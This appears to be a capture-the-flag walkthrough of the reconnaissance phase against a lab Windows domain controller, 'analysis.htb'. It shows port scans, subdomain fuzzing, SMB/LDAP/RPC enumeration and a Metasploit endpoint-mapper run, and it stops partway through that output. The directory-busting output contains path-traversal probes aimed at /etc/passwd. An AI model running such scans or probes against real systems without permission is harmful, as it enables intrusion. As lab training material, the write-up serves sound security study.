# Analysis

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.36.127
[sudo] password for user: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 19:35 UTC
Nmap scan report for 10.129.36.127
Host is up (0.11s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-20 19:29:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3306/tcp open  mysql         MySQL (unauthorized)
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-20T19:29:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -5m43s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.33 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.36.127
[sudo] password for user: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 20:43 UTC
Nmap scan report for 10.129.36.127
Host is up (0.053s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-20 20:36:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  unknown
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  unknown
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  unknown
49674/tcp open  unknown
49683/tcp open  unknown
49692/tcp open  unknown
49708/tcp open  msrpc         Microsoft Windows RPC
54293/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=1/20%Time=65AC3084%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\
SF:0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(T
SF:LSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\
SF:0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhF
SF:ourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1
SF:e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(L
SF:DAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x8
SF:8'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\"\x05HY0
SF:00")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x0
SF:5\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20m
SF:essage\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRe
SF:quest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\x20message-fr
SF:ame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -6m53s
| smb2-time: 
|   date: 2024-01-20T20:37:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.76 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.36.127
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 20:54 UTC
Nmap scan report for 10.129.36.127
Host is up (0.075s latency).
Not shown: 983 closed udp ports (port-unreach)
PORT      STATE         SERVICE      VERSION
53/udp    open          domain       Simple DNS Plus
88/udp    open          kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-20 20:49:52Z)
123/udp   open          ntp          NTP v3
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
389/udp   open          ldap         Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
464/udp   open|filtered kpasswd5
500/udp   open|filtered isakmp
4500/udp  open|filtered nat-t-ike
5353/udp  open|filtered zeroconf
5355/udp  open|filtered llmnr
55544/udp open|filtered unknown
55587/udp open|filtered unknown
56141/udp open|filtered unknown
57172/udp open|filtered unknown
57409/udp open|filtered unknown
57410/udp open|filtered unknown
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1337.09 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.36.127   analysis.htb
```

### Enumeration of Port 80/TCP

> http://analysis.htb/

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://analysis.htb/ 
http://analysis.htb/ [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.129.36.127], JQuery, Microsoft-IIS[10.0], Script[text/javascript]
```

> view-source:http://analysis.htb/#!/home

> view-source:http://analysis.htb/js/forms.js

```c
//forms

$(window).load(function(){
	$('#form1')
		.forms({
			ownerEmail:'support@template-help.com'
		})
})

;(function($){
	$.fn.forms=function(o){
		return this.each(function(){
			var th=$(this)
				,_=th.data('forms')||{
					errorCl:'error',
					emptyCl:'empty',
					invalidCl:'invalid',
					notRequiredCl:'notRequired',
					successCl:'success',
					successShow:'4000',
					mailHandlerURL:'bat/MailHandler.php',
					ownerEmail:'#',
					stripHTML:true,
					smtpMailServer:'localhost',
					targets:'input,textarea',
					controls:'a[data-type=reset],a[data-type=submit]',
					validate:true,
```

```c
bat/
```

> http://analysis.htb/#!/mail

### Subdomain Enumeration with ffuf

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.analysis.htb" -u http://10.129.36.127/

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.36.127/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.analysis.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 58ms]
:: Progress: [114441/114441] :: Job [1/1] :: 379 req/sec :: Duration: [0:05:10] :: Errors: 0 ::
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.36.127   analysis.htb
10.129.36.127   internal.analysis.htb
```

### More Enumeration with dig

```c
┌──(user㉿kali)-[~]
└─$ dig ANY analysis.htb @10.129.36.127

; <<>> DiG 9.19.19-1-Debian <<>> ANY analysis.htb @10.129.36.127
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25964
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;analysis.htb.                  IN      ANY

;; ANSWER SECTION:
analysis.htb.           600     IN      A       10.129.36.127
analysis.htb.           3600    IN      NS      dc-analysis.analysis.htb.
analysis.htb.           3600    IN      SOA     dc-analysis.analysis.htb. hostmaster.analysis.htb. 246 900 600 86400 3600

;; ADDITIONAL SECTION:
dc-analysis.analysis.htb. 3600  IN      A       10.129.36.127

;; Query time: 83 msec
;; SERVER: 10.129.36.127#53(10.129.36.127) (TCP)
;; WHEN: Sat Jan 20 19:42:08 UTC 2024
;; MSG SIZE  rcvd: 146
```

### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://analysis.htb 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/reports/http_analysis.htb/_24-01-20_19-48-40.txt

Target: http://analysis.htb/

[19:48:40] Starting: 
[19:48:43] 403 -  312B  - /%2e%2e//google.com                               
[19:48:43] 301 -  158B  - /js  ->  http://analysis.htb/js/                  
[19:48:43] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[19:48:47] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[19:48:58] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[19:49:01] 301 -  159B  - /css  ->  http://analysis.htb/css/                
[19:49:07] 403 -    1KB - /images/                                          
[19:49:07] 301 -  162B  - /images  ->  http://analysis.htb/images/          
[19:49:09] 403 -    1KB - /js/                                              
                                                                             
Task Completed
```

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://internal.analysis.htb

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/reports/http_internal.analysis.htb/_24-01-20_19-43-11.txt

Target: http://internal.analysis.htb/

[19:43:11] Starting:                                                                                                                                                                                                                        
[19:43:13] 403 -  312B  - /%2e%2e//google.com
[19:43:13] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[19:43:18] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[19:43:30] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[19:43:34] 301 -  174B  - /dashboard  ->  http://internal.analysis.htb/dashboard/
[19:44:03] 301 -  170B  - /users  ->  http://internal.analysis.htb/users/   
                                                                             
Task Completed
```

### SMB Enumeration

```c
┌──(user㉿kali)-[~]
└─$ crackmapexec smb analysis.htb -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
SMB         analysis.htb    445    DC-ANALYSIS      [*] Windows 10.0 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
SMB         analysis.htb    445    DC-ANALYSIS      [+] analysis.htb\: 
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*] Started module spidering_plus with the following options:
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*]  DOWNLOAD_FLAG: False
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*]     STATS_FLAG: True
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*]  OUTPUT_FOLDER: /tmp/cme_spider_plus
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [+] Saved share-file metadata to "/tmp/cme_spider_plus/analysis.htb.json".
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*] Total folders found:  0
SPIDER_P... analysis.htb    445    DC-ANALYSIS      [*] Total files found:    0
```

### Enumeration with enum4linux-ng

```c
┌──(user㉿kali)-[~/opt/01_information_gathering/enum4linux-ng]
└─$ python3 enum4linux-ng.py 10.129.36.127
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.36.127
[*] Username ......... ''
[*] Random Username .. 'thcnflpg'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on 10.129.36.127   |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.129.36.127   |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: analysis.htb

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.36.127   |
 ===========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on 10.129.36.127   |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB signing required: true                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           

 ===========================================================
|    Domain Information via SMB session for 10.129.36.127   |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
DNS domain: analysis.htb                                                                                                                                                                                                                    
Derived domain: ANALYSIS                                                                                                                                                                                                                    
Derived membership: domain member                                                                                                                                                                                                           
FQDN: DC-ANALYSIS.analysis.htb                                                                                                                                                                                                              
NetBIOS computer name: DC-ANALYSIS                                                                                                                                                                                                          
NetBIOS domain name: ANALYSIS                                                                                                                                                                                                               

 =========================================
|    RPC Session Check on 10.129.36.127   |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ===================================================
|    Domain Information via RPC for 10.129.36.127   |
 ===================================================
[+] Domain: ANALYSIS
[+] Domain SID: S-1-5-21-916175351-3772503854-3498620144
[+] Membership: domain member

 ===============================================
|    OS Information via RPC for 10.129.36.127   |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
Native LAN manager: not supported                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS build: '17763'                                                                                                                                                                                                                           
OS release: '1809'                                                                                                                                                                                                                          
OS version: '10.0'                                                                                                                                                                                                                          
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 =====================================
|    Users via RPC on 10.129.36.127   |
 =====================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ======================================
|    Groups via RPC on 10.129.36.127   |
 ======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ======================================
|    Shares via RPC on 10.129.36.127   |
 ======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =========================================
|    Policies via RPC for 10.129.36.127   |
 =========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =========================================
|    Printers via RPC for 10.129.36.127   |
 =========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 14.03 seconds
```

### Quick Check on LDAP

```c
┌──(user㉿kali)-[~]
└─$ ldapsearch -H ldap://10.129.36.127 -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=analysis,DC=htb
ldapServiceName: analysis.htb:dc-analysis$@ANALYSIS.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=analysis,DC=htb
serverName: CN=DC-ANALYSIS,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=C
 onfiguration,DC=analysis,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=analysis,DC=htb
namingContexts: DC=analysis,DC=htb
namingContexts: CN=Configuration,DC=analysis,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=analysis,DC=htb
namingContexts: DC=DomainDnsZones,DC=analysis,DC=htb
namingContexts: DC=ForestDnsZones,DC=analysis,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 377058
dsServiceName: CN=NTDS Settings,CN=DC-ANALYSIS,CN=Servers,CN=Default-First-Sit
 e-Name,CN=Sites,CN=Configuration,DC=analysis,DC=htb
dnsHostName: DC-ANALYSIS.analysis.htb
defaultNamingContext: DC=analysis,DC=htb
currentTime: 20240120194941.0Z
configurationNamingContext: CN=Configuration,DC=analysis,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

### Quick Check on RPC

> https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#how-does-msrpc-work

```c
┌──(user㉿kali)-[~]
└─$ sudo rpcdump.py 10.129.36.127
<--- SNIP --->
```

```c
┌──(user㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Set the current module's RHOSTS with database values using 
hosts -R or services -R
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.3.50-dev                          ]
+ -- --=[ 2378 exploits - 1233 auxiliary - 416 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use auxiliary/scanner/dcerpc/endpoint_mapper
msf6 auxiliary(scanner/dcerpc/endpoint_mapper) > set RHOSTS 10.129.36.127
RHOSTS => 10.129.36.127
msf6 auxiliary(scanner/dcerpc/endpoint_mapper) > run

[*] 10.129.36.127:135      - Connecting to the endpoint mapper service...
[*] 10.129.36.127:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 TCP (49664) 10.129.36.127 
[*] 10.129.36.127:135      - 0767a036-0d22-48aa-ba69-b619480f38cb v1.0 LRPC (LRPC-ca0ec9b51eb0b40245) [PcaSvc]
[*] 10.129.36.127:135      - be7f785e-0e3a-4ab7-91de-7e46e443be29 v0.0 LRPC (LRPC-e0bc8ac2b7ef6a3ddb) 
[*] 10.129.36.127:135      - 54b4c689-969a-476f-8dc2-990885e9f562 v0.0 LRPC (LRPC-e0bc8ac2b7ef6a3ddb) 
[*] 10.129.36.127:135      - bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 LRPC (OLE73406E5050B3168223BF1E340D5E) 
[*] 10.129.36.127:135      - bf4dc912-e52f-4904-8ebe-9317c1bdd497 v1.0 LRPC (LRPC-0fb948e1917dde3d65) 
[*] 10.129.36.127:135      - 30adc50c-5cbc-46ce-9a0e-91914789e23c v1.0 LRPC (LRPC-de51038ae89f1c0448) [NRP server endpoint]
[*] 10.129.36.127:135      - 897e2e5f-93f3-4376-9c9c-fd2277495c27 v1.0 LRPC (OLE63967E63B3ED6BF537B0114C7194) [Frs2 Service]
[*] 10.129.36.127:135      - 897e2e5f-93f3-4376-9c9c-fd2277495c27 v1.0 TCP (57777) 10.129.36.127 [Frs2 Service]
[*] 10.129.36.127:135      - 8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 LRPC (OLEFF5C7143FE6233106762F7326C65) 
[*] 10.129.36.127:135      - 8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 LRPC (LRPC-7d5faf87cbc810ade6) 
[*] 10.129.36.127:135      - 0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 LRPC (OLEFF5C7143FE6233106762F7326C65) 
[*] 10.129.36.127:135      - 0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 LRPC (LRPC-7d5faf87cbc810ade6) 
[*] 10.129.36.127:135      - b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 LRPC (OLEFF5C7143FE6233106762F7326C65) 
[*] 10.129.36.127:135      - b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 LRPC (LRPC-7d5faf87cbc810ade6) 
